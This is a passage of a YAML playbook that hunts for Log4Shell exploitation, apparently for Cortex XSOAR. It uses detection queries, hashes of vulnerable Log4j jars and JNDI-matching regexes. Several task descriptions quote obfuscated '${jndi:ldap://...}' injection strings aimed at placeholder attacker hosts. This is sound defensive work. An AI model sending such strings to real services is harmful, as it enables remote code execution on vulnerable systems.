          |alter rfc1918_192 = incidr(action_remote_ip, "192.168.0.0/16")

          |filter rfc1918_172 = false and rfc1918_10 = false and rfc1918_192 = false

          |comp count_distinct(action_remote_ip) as Count by agent_hostname

          ) as Count_External_IPs (Count_External_IPs.agent_hostname = agent_hostname )

          | filter Count >0
      query_name:
        simple: Search for process names "java" interacted with "log4j"
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Attempting to detect all Log4j jar loading - Trying to find all
        applications that utilize Log4j is nearly impossible, as it is bundled in
        a ton of different software.With that being said, we believe that this query
        will enable you to get at least a partial grip of this package usage within
        your environment.
      id: 5aaedc40-41dc-470b-8380-a120c981d889
      iscommand: true
      name: Search for process names "java" interacted with "log4j"
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: 5aaedc40-41dc-470b-8380-a120c981d889
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -790,
          "y": 2215
        }
      }
  "78":
    continueonerrortype: ""
    id: "78"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          dataset = xdr_data
          | fields agent_hostname , action_file_sha256, action_file_path , actor_process_image_sha256 , actor_process_image_path , causality_actor_process_image_sha256 , causality_actor_process_image_path

          | filter action_file_sha256 in ("bf4f41403280c1b115650d470f9b260a5c9042c04d9bcc2a6ca504a66379b2d6", "58e9f72081efff9bdaabd82e3b3efe5b1b9f1666cefe28f429ad7176a6d770ae", "ed285ad5ac6a8cf13461d6c2874fdcd3bf67002844831f66e21c2d0adda43fa4", "dbf88c623cc2ad99d82fa4c575fb105e2083465a47b84d64e2e1a63e183c274e", "a38ddff1e797adb39a08876932bc2538d771ff7db23885fb883fec526aff4fc8", "7d86841489afd1097576a649094ae1efb79b3147cd162ba019861dfad4e9573b", "4bfb0d5022dc499908da4597f3e19f9f64d3cc98ce756a2249c72179d3d75c47", "473f15c04122dad810c919b2f3484d46560fd2dd4573f6695d387195816b02a6", "b3fae4f84d4303cdbad4696554b4e8d2381ad3faf6e0c3c8d2ce60a4388caa02", "dcde6033b205433d6e9855c93740f798951fa3a3f252035a768d9f356fde806d", "85338f694c844c8b66d8a1b981bcf38627f95579209b2662182a009d849e1a4c", "db3906edad6009d1886ec1e2a198249b6d99820a3575f8ec80c6ce57f08d521a", "ec411a34fee49692f196e4dc0a905b25d0667825904862fdba153df5e53183e0", "a00a54e3fb8cb83fab38f8714f240ecc13ab9c492584aa571aec5fc71b48732d", "c584d1000591efa391386264e0d43ec35f4dbb146cad9390f73358d9c84ee78d", "8bdb662843c1f4b120fb4c25a5636008085900cdf9947b1dadb9b672ea6134dc", "c830cde8f929c35dad42cbdb6b28447df69ceffe99937bf420d32424df4d076a", "6ae3b0cb657e051f97835a6432c2b0f50a651b36b6d4af395bbe9060bb4ef4b2", "535e19bf14d8c76ec00a7e8490287ca2e2597cae2de5b8f1f65eb81ef1c2a4c6", "42de36e61d454afff5e50e6930961c85b55d681e23931efd248fd9b9b9297239", "4f53e4d52efcccdc446017426c15001bb0fe444c7a6cdc9966f8741cf210d997", "df00277045338ceaa6f70a7b8eee178710b3ba51eac28c1142ec802157492de6", "28433734bd9e3121e0a0b78238d5131837b9dbe26f1a930bc872bad44e68e44e", "cf65f0d33640f2cd0a0b06dd86a5c6353938ccb25f4ffd14116b4884181e0392", "5bb84e110d5f18cee47021a024d358227612dd6dac7b97fa781f85c6ad3ccee4", "ccf02bb919e1a44b13b366ea1b203f98772650475f2a06e9fac4b3c957a7c3fa", "815a73e20e90a413662eefe8594414684df3d5723edcd76070e1a5aee864616e", "10ef331115cbbd18b5be3f3761e046523f9c95c103484082b18e67a7c36e570c", "dc815be299f81c180aa8d2924f1b015f2c46686e866bc410e72de75f7cd41aae", "9275f5d57709e2204900d3dae2727f5932f85d3813ad31c9d351def03dd3d03d", "f35ccc9978797a895e5bee58fa8c3b7ad6d5ee55386e9e532f141ee8ed2e937d", "5256517e6237b888c65c8691f29219b6658d800c23e81d5167c4a8bbd2a0daa3", "d4485176aea67cc85f5ccc45bb66166f8bfc715ae4a695f0d870a1f8d848cc3d", "3fcc4c1f2f806acfc395144c98b8ba2a80fe1bf5e3ad3397588bbd2610a37100", "057a48fe378586b6913d29b4b10162b4b5045277f1be66b7a01fb7e30bd05ef3", "5dbd6bb2381bf54563ea15bc9fbb6d7094eaf7184e6975c50f8996f77bfc3f2c", "c39b0ea14e7766440c59e5ae5f48adee038d9b1c7a1375b376e966ca12c22cd3", "6f38a25482d82cd118c4255f25b9d78d96821d22bab498cdce9cda7a563ca992", "54962835992e303928aa909730ce3a50e311068c0960c708e82ab76701db5e6b", "e5e9b0f8d72f4e7b9022b7a83c673334d7967981191d2d98f9c57dc97b4caae1", "68d793940c28ddff6670be703690dfdf9e77315970c42c4af40ca7261a8570fa", "9da0f5ca7c8eab693d090ae759275b9db4ca5acdbcfe4a63d3871e0b17367463", "006fc6623fbb961084243cfc327c885f3c57f2eba8ee05fbc4e93e5358778c85")

          | dedup agent_hostname , action_file_sha256, action_file_path , actor_process_image_sha256 , actor_process_image_path , causality_actor_process_image_sha256 , causality_actor_process_image_path
      query_name:
        simple: Detecting a files that matches the SHA256 hash of the Log4j vulnerable
          versions.
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Attempt to target all hosts that contain a file that matches the
        SHA256 hash of the Log4j vulnerable versions.
      id: d08f9423-e874-4711-8585-d305b90facab
      iscommand: true
      name: Detecting a files that matches the SHA256 hash of the Log4j vulnerable
        versions.
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: d08f9423-e874-4711-8585-d305b90facab
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -1230,
          "y": 2215
        }
      }
  "79":
    continueonerrortype: ""
    id: "79"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          config case_sensitive = false timeframe=7d |
          dataset = xdr_data

          | filter lowercase(action_user_agent) ~= "((?:\%24\%7B|\$%7B|\$\{|\$[^//]+\{)(?:j|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+j|(?:\-|\}|\:|\:\-|\}|\:|\$)j[^//]+|jn|jnd)(?:n|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+n|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|nd|ndi)?(?:d|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+d|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|di)(?:i|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+i|(?:\-|\}|\:|\:\-|\}|\:|\$)i[^//]+))" OR lowercase(action_user_agent) ~= "\${jndi"

          | alter rfc1918_172 = incidr(action_remote_ip , "172.16.0.0/12")

          | alter rfc1918_10 = incidr(action_remote_ip, "10.0.0.0/8")

          | alter rfc1918_192 = incidr(action_remote_ip, "192.168.0.0/16")

          | filter (rfc1918_172 = false and rfc1918_10 = false and rfc1918_192 = false)

          | fields action_user_agent,agent_hostname, action_process_image_name, action_process_image_command_line
      query_name:
        simple: Detecting Potentially Malicious Activity Attributed with the Log4j
          Exploitation
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Section B: Detecting Potentially Malicious Activity Attributed with the Log4j Exploitation

        Given the sheer amount of obfuscation possible on the malicious User-Agents like:
        ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://${hostName}
        ${JnD${upper:i}:lda${env:XXXX2323:-p}:/
        ${jndi:ldap://host/$
        ${jndi:${lower:l}${lower:d}a${lower:p}:
        Weve decided to choose a regular expression targeting all permutations of the potential resources.
      id: 1294ccc5-eb2c-491b-8896-77a716c28904
      iscommand: true
      name: Detecting Potentially Malicious Activity Attributed with the Log4j Exploitation
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: 1294ccc5-eb2c-491b-8896-77a716c28904
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -380,
          "y": 2215
        }
      }
  "80":
    continueonerrortype: ""
    id: "80"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      "no":
      - "29"
      "yes":
      - "81"
      - "82"
    note: false
    quietmode: 0
    scriptarguments:
      brandname:
        simple: Cortex XDR - XQL Query Engine
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Returns 'yes' if integration brand is available. Otherwise returns
        'no'
      id: dc28907d-f40c-4671-8d67-97ba6e172080
      iscommand: false
      name: Check if Cortex XDR - XQL Query Engine is Enabled
      script: IsIntegrationAvailable
      type: condition
      version: -1
    taskid: dc28907d-f40c-4671-8d67-97ba6e172080
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 670,
          "y": 1900
        }
      }
  "81":
    continueonerrortype: ""
    id: "81"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "79"
      - "77"
      - "78"
      - "86"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: aab0f2d9-b0e1-4239-81c0-0d97454b7c8c
      iscommand: false
      name: Hunting for Log4Shell in Your Network
      type: title
      version: -1
    taskid: aab0f2d9-b0e1-4239-81c0-0d97454b7c8c
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": -1000,
          "y": 2070
        }
      }
  "82":
    continueonerrortype: ""
    id: "82"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "84"
      - "85"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 33b1987f-71f9-4b40-8654-6cca4f740fd7
      iscommand: false
      name: Hunting for Log4Shell in Your Cloud Environment
      type: title
      version: -1
    taskid: 33b1987f-71f9-4b40-8654-6cca4f740fd7
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 320,
          "y": 2070
        }
      }
  "84":
    continueonerrortype: ""
    id: "84"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          dataset = cloud_audit_logs
          | alter raw_log_decoded = replace(replace(replace(lowercase(raw_log), "%7b", "{"), "%24","$"), "%7d", "}")

          | filter raw_log_decoded ~= "((?:\%24\%7B|\$%7B|\$\{|\$[^//]+\{)(?:j|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+j|(?:\-|\}|\:|\:\-|\}|\:|\$)j[^//]+|jn|jnd)(?:n|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+n|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|nd|ndi)?(?:d|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+d|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|di)(?:i|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+i|(?:\-|\}|\:|\:\-|\}|\:|\$)i[^//]+))" OR raw_log_decoded ~= "\${jndi"
          | fields caller_ip, project, identity_name, identity_type, identity_sub_type, operation_name_orig, operation_status, referenced_resource_name, caller_ip_asn_org, caller_ip_geolocation
      query_name:
        simple: Hunt additional exploitation attempts within cloud audit logs
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: "Leveraging the exploitation upon API calls (as those API calls
        are usually logged) and their associated attributes controlled by the attacker
        such as the requests parameters of the API call or  the user-agent. \nFor
        example:\nCloud storage services, modify the object name:\nprojects/_/buckets/<BUCKET-NAME>/objects/${jndi:ldap://<ATTACKER-IP>:<PORT>/Exploit}\nUser
        agent:\n${jndi:${lower:l}${lower:d}a${lower:p}://<ATTACKER-DNS>.bin${upper:a}.io:<PORT>/callback}"
      id: f65dc8bc-438b-4322-8566-e5742aa63156
      iscommand: true
      name: Hunt additional exploitation attempts within cloud audit logs
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: f65dc8bc-438b-4322-8566-e5742aa63156
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 90,
          "y": 2215
        }
      }
  "85":
    continueonerrortype: ""
    id: "85"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          dataset = cloud_audit_logs
          | alter raw_log_decoded = replace(replace(replace(lowercase(raw_log), "%7b", "{"), "%24","$"), "%7d", "}")

          | filter raw_log_decoded ~= "((?:\%24\%7B|\$%7B|\$\{|\$[^//]+\{)(?:j|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+j|(?:\-|\}|\:|\:\-|\}|\:|\$)j[^//]+|jn|jnd)(?:n|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+n|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|nd|ndi)?(?:d|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+d|(?:\-|\}|\:|\:\-|\}|\:|\$)n[^//]+|di)(?:i|(?:\-|\}|\:|\:\-|\}|\:|\$)[^//]+i|(?:\-|\}|\:|\:\-|\}|\:|\$)i[^//]+))" OR raw_log_decoded ~= "\${jndi"

          | filter lowercase(operation_name_orig) not contains "jobservice" and user_agent != null

          | alter ip = arrayindex(regextract(user_agent, "\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"), 0)

          | filter ip != null

          | fields ip, user_agent, raw_log_decoded

          | join (dataset = xdr_data

          | filter action_remote_ip != null and (event_type = enum.STORY or event_type = enum.NETWORK)

          | fields action_remote_ip, cloud_entity, agent_id

          | alter cloud_instance_name = json_extract_scalar(to_json_string(cloud_entity), "$.entity_name")

          | dedup action_remote_ip, agent_id, cloud_instance_name) as remote_ips

          ip = remote_ips.action_remote_ip

          | fields ip, user_agent, agent_id, cloud_instance_name, raw_log_decoded
      query_name:
        simple: 'Hunt for successful exploitations by looking at EDR, Firewall and
          flow logs '
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Due to the fact that there are so many exploitation attempts, finding a successful exploitation is not an easy task. However, we can leverage the power of all XDR data resources and hunt those malicious connections.

        By correlating between Cortex XDR cloud, NDR and EDR logs, we are able to extract IOCs from exploitation attempts and match them with established outbound network connections.

        For example, we can extract the attacker IP address from the payload as seen in Cortex XDR cloud logs, and look for successful outbound connections to this IP address. The same steps can be implemented for DNS queries.
      id: 99234f88-5570-4d2b-8a72-34d703b02bed
      iscommand: true
      name: 'Hunt for successful exploitations by looking at EDR, Firewall and flow
        logs '
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: 99234f88-5570-4d2b-8a72-34d703b02bed
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 530,
          "y": 2215
        }
      }
  "86":
    continueonerrortype: ""
    id: "86"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "29"
    note: false
    quietmode: 2
    scriptarguments:
      query:
        simple: |-
          config case_sensitive = false timeframe=90d |
          dataset = xdr_data

          | alter ct = current_time()

          | alter diff = timestamp_diff(ct, _time, "DAY")

          | filter event_type = ENUM.FILE

          and (

          actor_process_image_name contains "java"

          )

          and diff < 7

          | dedup action_process_image_command_line, agent_hostname, actor_process_image_name

          | fields action_file_path , action_file_name,agent_hostname, actor_process_image_name, action_process_image_name

          | join conflict_strategy = left type = left

          (

          dataset = xdr_data

          | filter event_type = ENUM.FILE

          and (

          actor_process_image_name contains "java"

          )

          | comp count(action_file_name) as Action_File_Days_count by actor_process_image_name

          ) as Three_Months_Action_Process (Three_Months_Action_Process.actor_process_image_name = actor_process_image_name)

          | join conflict_strategy = left type = left

          (

          dataset = xdr_data

          | filter event_type = ENUM.FILE

          and (

          actor_process_image_name contains "java"

          )

          | comp count(action_file_path) as Path_Days_count by actor_process_image_name

          ) as Three_Months_CommandLine (Three_Months_CommandLine.actor_process_image_name = action_process_image_name )

          | dedup agent_hostname ,actor_process_image_name , action_process_image_name

          | sort asc Path_Days_count , asc Action_File_Days_count

          | filter Path_Days_count < 10 and Action_File_Days_count <10
      query_name:
        simple: Creation of a list of the rare Java process
      time_frame:
        simple: 7 days
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: |-
        Harness the power of out of the ordinary- The following query will create a list of the rare Java process causality chains for both action processes and their command lines.

        This means that for Java Child Process, the query will count the number of appearances over the past 90 days, and will list them only if they were spotted for less than 10 times on this specific host.

        Ideally, for any type of payload, you will be able to uncover any unusual processes and their commands.
      id: 10bff38a-ea28-40c6-86bf-f6a84c5e8f0c
      iscommand: true
      name: Creation of a list of the rare Java process
      script: '|||xdr-xql-generic-query'
      tags:
      - UserXQL
      type: regular
      version: -1
    taskid: 10bff38a-ea28-40c6-86bf-f6a84c5e8f0c
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": -1670,
          "y": 2210
        }
      }
  "87":
    continueonerrortype: ""
    id: "87"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "69"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: b66361f8-4f5c-4813-8a18-65ffb51067c1
      iscommand: false
      name: Hunt Linux OS
      type: title
      version: -1
    taskid: b66361f8-4f5c-4813-8a18-65ffb51067c1
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 1520,
          "y": 1570
        }
      }
  "88":
    continueonerrortype: ""
    id: "88"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "89"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      id: 6429ae05-2180-4d2e-8311-474f72c05fad
      iscommand: false
      name: Xpanse
      type: title
      version: -1
    taskid: 6429ae05-2180-4d2e-8311-474f72c05fad
    timertriggers: []
    type: title
    view: |-
      {
        "position": {
          "x": 2420,
          "y": 720
        }
      }
  "89":
    conditions:
    - condition:
      - - ignorecase: true
          left:
            iscontext: true
            value:
              complex:
                accessor: state
                filters:
                - - ignorecase: true
                    left:
                      iscontext: true
                      value:
                        simple: modules.brand
                    operator: containsString
                    right:
                      value:
                        simple: Xpanse
                root: modules
          operator: isEqualString
          right:
            value:
              simple: active
      label: "yes"
    continueonerrortype: ""
    id: "89"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#default#':
      - "37"
      "yes":
      - "90"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Checks if Xpanse instance is enabled.
      id: 2630ffbe-0a7b-41a1-8713-189effa6a56c
      iscommand: false
      name: Is Xpanse enabled?
      type: condition
      version: -1
    taskid: 2630ffbe-0a7b-41a1-8713-189effa6a56c
    timertriggers: []
    type: condition
    view: |-
      {
        "position": {
          "x": 2420,
          "y": 850
        }
      }
  "90":
    continueonerrortype: ""
    id: "90"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "91"
    note: false
    quietmode: 0
    scriptarguments:
      issue_type:
        simple: |-
          Adobe ColdFusion, Apache Solr, Cisco Identity Services Engine (ISE), Cisco Integrated Management Controller (IMC), Cisco Unified Communications Manager, Cisco Unified Computing System, Cisco Webex Meetings Server, Co-Located Elasticsearch Server, Dell Wyse Management Suite, Elasticsearch Server
          , Fortinet Device, IBM WebSphere Application Server, Java Application, Oracle E-Business Suite, Oracle Fusion Middleware, Palo Alto Networks Panorama Admin Login Page, SonicWall Email Security, VMware Carbon Black EDR, VMware vCenter, VMware vRealize Automation , , Appliance, VMware vRealize Suite Lifecycle Manager, VMware Workspace ONE Access Server
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: Retrieve issues
      id: 115da179-1c30-4ff0-8545-bbbdc820bae9
      iscommand: true
      name: Search for possible vulnerable servers
      script: '|||expanse-get-issues'
      type: regular
      version: -1
    taskid: 115da179-1c30-4ff0-8545-bbbdc820bae9
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2670,
          "y": 1020
        }
      }
  "91":
    continueonerrortype: ""
    id: "91"
    ignoreworker: false
    isautoswitchedtoquietmode: false
    isoversize: false
    nexttasks:
      '#none#':
      - "37"
    note: false
    quietmode: 0
    separatecontext: false
    skipunavailable: false
    task:
      brand: ""
      description: "Expander shows systems that are exposed to the public internet,
        without the need to install agents or sensors of any kind. Some of the systems
        below do not advertise version information, or are otherwise restricted from
        doing so depending on the configuration of our customers networks. Expander
        attempts to retrieve or derive version information, but this is not possible
        in all cases. \n\nXpanse issue IDs:\n${Expanse.Issue.id}"
      id: d49fc54f-d0d0-42a7-89e7-910b6f7e4b0f
      iscommand: false
      name: 'Review possible vulnerable servers '
      type: regular
      version: -1
    taskid: d49fc54f-d0d0-42a7-89e7-910b6f7e4b0f
    timertriggers: []
    type: regular
    view: |-
      {
        "position": {
          "x": 2670,
          "y": 1210
        }
      }
version: -1
view: |-
  {
    "linkLabelsPosition": {
      "22_26_Yes": 0.53,
      "22_37_#default#": 0.22,
      "24_25_Yes": 0.53,
      "24_37_#default#": 0.16,
      "32_29_#default#": 0.15,
      "32_33_yes": 0.45,
      "33_29_#default#": 0.24,
      "33_70_ALL": 0.65,
      "69_29_no": 0.17,
      "69_32_yes": 0.42,
      "75_29_#default#": 0.2,
      "80_29_no": 0.12,
      "80_81_yes": 0.29,
      "80_82_yes": 0.43,
      "89_37_#default#": 0.17,
      "89_90_yes": 0.59
    },
    "paper": {
      "dimensions": {
        "height": 5725,
        "width": 4720,
        "x": -1670,
        "y": -1290
      }
    }
  }
